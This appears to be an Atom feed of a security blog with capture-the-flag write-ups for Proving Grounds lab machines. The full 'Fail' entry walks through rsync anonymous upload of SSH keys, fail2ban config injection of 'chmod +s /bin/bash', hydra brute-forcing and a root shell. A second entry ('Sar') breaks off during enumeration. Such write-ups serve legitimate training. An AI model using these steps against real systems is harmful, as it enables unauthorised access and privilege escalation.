<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://jayngng.github.io/blog/feed.xml" rel="self" type="application/atom+xml" /><link href="https://jayngng.github.io/" rel="alternate" type="text/html" /><updated>2021-08-19T11:36:48+10:00</updated><id>https://jayngng.github.io/blog/feed.xml</id><entry><title type="html">Fail - OSPG</title><link href="https://jayngng.github.io/blog/fail-ospg/" rel="alternate" type="text/html" title="Fail - OSPG" /><published>2021-08-19T20:03:02+10:00</published><updated>2021-08-19T20:03:02+10:00</updated><id>https://jayngng.github.io/blog/fail---ospg</id><content type="html" xml:base="https://jayngng.github.io/blog/fail-ospg/">&lt;h1 id=&quot;summary&quot;&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;In this writeup, we’ll acquire an initial access to the system via a misconfigured &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsync&lt;/code&gt; share, which allows us to upload a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.ssh&lt;/code&gt; key onto home directory of user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fox&lt;/code&gt;. We’ll then escalate privilge by abusing a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt; configuration file to trigger arbitrary commands of our choice.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;attack-narrative&quot;&gt;&lt;strong&gt;Attack Narrative&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;The attack is performed based upon three main phases:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Enumeration.&lt;/li&gt;
  &lt;li&gt;Exploitation.&lt;/li&gt;
  &lt;li&gt;Privilege Escalation.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;We’ll begin with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;

PORT    STATE SERVICE REASON         VERSION                     
22/tcp  open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;              
| ssh-hostkey:                 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
|   256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+
873/tcp open  rsync   syn-ack ttl 63 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol version 31&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;We discover two running services: &lt;strong&gt;SSH&lt;/strong&gt; and &lt;strong&gt;Rsyn&lt;/strong&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsync&lt;/code&gt; service will be the target of our investigations.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;rsync&quot;&gt;&lt;strong&gt;Rsync&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Essentially, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsync&lt;/code&gt; or remote synchronization is a Unix-like service mainly for transferring and syncing files and directories between machines on the network.&lt;/p&gt;

&lt;p&gt;Let’s us grab its banner and inspect if there is any interesting information.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nv&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt; 873                                              
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.118.126] 873 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;rsync&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; open
@RSYNCD: 31.0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;The version is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;31.0&lt;/code&gt;. Yet, this is not a vulnerable version.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;rsync-shares&quot;&gt;&lt;strong&gt;Rsync&lt;/strong&gt; Shares&lt;/h4&gt;
&lt;p&gt;Further enumerating the service might reveals us all the shares that currently available for accessing.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nv&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt; 873
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(UNKNOWN) [192.168.118.126] 873 (rsync) open
@RSYNCD: 31.0  -&amp;gt; Banner tells us version
@RSYNCD: 31.0  -&amp;gt; We then send them the same info 
&lt;span class=&quot;gh&quot;&gt;#list  -&amp;gt; Enumerate the server&lt;/span&gt;
&lt;span class=&quot;gs&quot;&gt;**fox             fox home**&lt;/span&gt;  -&amp;gt; End enumeration
@RSYNCD: EXIT  -&amp;gt; The server closes connection
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The results indicate that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fox&lt;/code&gt; module is available for sharing, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fox home&lt;/code&gt; is a description potentially implying the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;home&lt;/code&gt; directory of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fox&lt;/code&gt; user.&lt;/p&gt;

&lt;p&gt;Normally, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsync&lt;/code&gt; requires authentication to access the file share, let’s us check if we need to authenticate. This can be done by simply entering &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fox&lt;/code&gt;, which is the name of the module.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nv&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt; 873
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.118.126] 873 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;rsync&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; open
@RSYNCD: 31.0
@RSYNCD: 31.0
fox
@RSYNCD: OK
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@RSYNCD: OK&lt;/code&gt; response means no authentication needed to access the share.&lt;/p&gt;

&lt;p&gt;Now, we can list &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fox&lt;/code&gt; shares utilizing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsync&lt;/code&gt; utility:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync &lt;span class=&quot;nt&quot;&gt;-av&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--list-only&lt;/span&gt; rsync://&lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;/fox                                                                                                                                                 1 ⨯
receiving incremental file list
drwxr-xr-x          4,096 2021/01/21 09:21:59 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
lrwxrwxrwx              9 2020/12/03 15:22:42 .bash_history -&amp;gt; /dev/null
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;            220 2019/04/18 00:12:36 .bash_logout
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;          3,526 2019/04/18 00:12:36 .bashrc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;            807 2019/04/18 00:12:36 .profile

sent 20 bytes  received 136 bytes  44.57 bytes/sec
total size is 4,562  speedup is 29.24
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This works perfectly, we can choose to further investigate those files. However, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsync&lt;/code&gt; provides an ability to upload files onto the share module.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;rsync-anonymous-upload&quot;&gt;&lt;strong&gt;Rsync Anonymous Upload&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Knowing that we can upload files via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsync&lt;/code&gt;, we could then try to upload a SSH &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;authorized_keys&lt;/code&gt; onto the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fox&lt;/code&gt; share and SSH our way in as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fox&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The steps take to reproduce the attack:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Create a SSH key.
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh-keygen &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; fox_ssh
Generating public/private rsa key pair.
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Copy &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fox_ssh.pub&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;authorized_keys&lt;/code&gt;.
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;fox_ssh.pub authorized_keys
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Upload the newly created &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;authorized_keys&lt;/code&gt; onto the target share.&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync &lt;span class=&quot;nt&quot;&gt;-av&lt;/span&gt; authorized_keys rsync://&lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;/fox/.ssh 
sending incremental file list
authorized_keys

sent 674 bytes  received 35 bytes  202.57 bytes/sec
total size is 564  speedup is 0.80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;authorized_keys&lt;/code&gt; file is uploaded, we are able to connect via SSH as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fox&lt;/code&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;privilege-escalation&quot;&gt;&lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;fail2ban&quot;&gt;&lt;strong&gt;Fail2ban&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;It’s worth to notice our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fox&lt;/code&gt; user is in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt; group, and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt; service is executed by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; .&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fox@fail:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fox&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fox&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fox&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fail2ban&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Any user belonging to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt; group is able to modify the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt; configuration files. In order to achieve privilege escalation, we are particularly interested in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/fail2ban/action.d/iptables-multiport.conf&lt;/code&gt; file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fox@fail:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; /etc/fail2ban/action.d/iptables-multiport.conf
&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt; 1 root fail2ban 1440 Aug 18 19:43 /etc/fail2ban/action.d/iptables-multiport.conf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iptables-multiport.conf&lt;/code&gt; file enacts &lt;strong&gt;ban-action&lt;/strong&gt; laws. Basically, it manipulates the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iptables&lt;/code&gt; to ban any IP address that break the law by &lt;strong&gt;executing specific commands&lt;/strong&gt;.&lt;/p&gt;

&lt;h4 id=&quot;fail2ban-abuse&quot;&gt;&lt;strong&gt;Fail2ban&lt;/strong&gt; Abuse&lt;/h4&gt;
&lt;p&gt;Since we have &lt;strong&gt;write&lt;/strong&gt; permission of the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iptables-multiport.conf&lt;/code&gt;, we should be able to control which command to run when the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt; is triggered.&lt;/p&gt;

&lt;p&gt;All our jobs now are injecting a desired command that we want to be run by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;, and triggering the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt; service.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nano /etc/fail2ban/action.d/iptables-multiport.conf

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
actionunban &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &amp;lt;iptables&amp;gt; &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; f2b-&amp;lt;name&amp;gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &amp;lt;ip&amp;gt; &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; &amp;lt;blocktype&amp;gt;
                &lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +s /bin/bash
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Init]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The command that we inject will grant &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt; a SUID permission.&lt;/p&gt;

&lt;p&gt;Then we trigger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt; to execute our command by brute-forcing the SSH.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hydra &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; fox &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; /usr/share/wordlists/rockyou.txt ssh://&lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] attacking ssh://192.168.118.126:22/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ERROR] ssh target does not support password auth
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;After a few tries, we are banned by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt;, which indicates that our injected command should be triggered.&lt;/p&gt;

&lt;p&gt;Now, if we inspect the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt; file, we can see that it’s dressed up with a SUID bit.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fox@fail:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; /bin/bash
&lt;span class=&quot;nt&quot;&gt;-rwsr-sr-x&lt;/span&gt; 1 root root 1168776 Apr 18  2019 /bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Perfectly, we can then drop our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; shell by executing the following command:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fox@fail:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/bin/bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
bash-5.0# &lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;root
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;and become &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;!.&lt;/p&gt;</content><author><name></name></author><category term="ctf" /><category term="pg" /><category term="linux" /><summary type="html">Summary In this writeup, we’ll acquire an initial access to the system via a misconfigured rsync share, which allows us to upload a .ssh key onto home directory of user fox. We’ll then escalate privilge by abusing a fail2ban configuration file to trigger arbitrary commands of our choice.</summary></entry><entry><title type="html">Sar - OSPG</title><link href="https://jayngng.github.io/blog/sar-ospg/" rel="alternate" type="text/html" title="Sar - OSPG" /><published>2021-08-19T04:48:37+10:00</published><updated>2021-08-19T04:48:37+10:00</updated><id>https://jayngng.github.io/blog/sar---ospg</id><content type="html" xml:base="https://jayngng.github.io/blog/sar-ospg/">&lt;h1 id=&quot;summary-of-result&quot;&gt;&lt;strong&gt;Summary Of Result&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;The machine is compromised by exploiting the vulnerable version of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sar2html&lt;/code&gt;. Once we’ve obtained the initial access, we can then escalate our privilege via a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; ‘s crontab that executes a custom &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.sh&lt;/code&gt; of our control.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;nmap&quot;&gt;&lt;strong&gt;Nmap&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;We will start our scan with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 33:40:be:13:cf:51:7d:d6:a5:9c:64:c8:13:e5:f2:9f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHy/WJJHLFdbwbJpTyRYhEyj2jZV024UPWIdXfNHxq45uh08jkihv3znZ98caLP/pz352c0ZYD31We0bTSbHyjQce2bSAJHubDYp13hU/P4tbV5GIJ72W2rWkLTslH/SJoHUSqlManB7ZzgVyU2KQ4fnNx/V1XGJYsshquRqTrXKeeal+yQvTC4gnsr8ENIGMq0yJnYxMAasx6kmSc+S+065Mie65xkyisFXo2MQyxzsFdCu2w1bYmb3pegYDm6Y0c/EJP0sxDizXVwkUOS0XSVdGuk3RUYjt5GQ2fL24ZsML6CwN+HD2ZTnD0FK90PQTLuvlp6BoI/ZWvIenNvu63
|   256 8a:4e:ab:0b:de:e3:69:40:50:98:98:58:32:8f:71:9e &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFgxutbLnN4K2tj6ZHzrlzTKS+RRuly+RkA0J63JsQFiwyvz4PqA64w/h0Se3gymZV6zJ9XBpS41b6IoEymeiSA&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
|   256 e6:2f:55:1c:db:d0:bb:46:92:80:dd:5f:8e:a3:0a:41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM+5254x35Vwa2S7X73YLY87Q58qQOD9oQeSKMpmmT0o
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Apache2 Ubuntu Default Page: It works
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There are only two services running on the target: &lt;strong&gt;SSH&lt;/strong&gt; and &lt;strong&gt;HTTP&lt;/strong&gt;.&lt;/p&gt;

&lt;h4 id=&quot;ffuf&quot;&gt;&lt;strong&gt;Ffuf&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt; is used to discover hidden directories of a web application. We can start &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt; by giving it a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-u&lt;/code&gt; flag for URL and a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-w&lt;/code&gt; flag for wordlist. The comprehensive command will look like:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://192.168.123.35/FUZZ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Discovery/Web-Content/common.txt
...
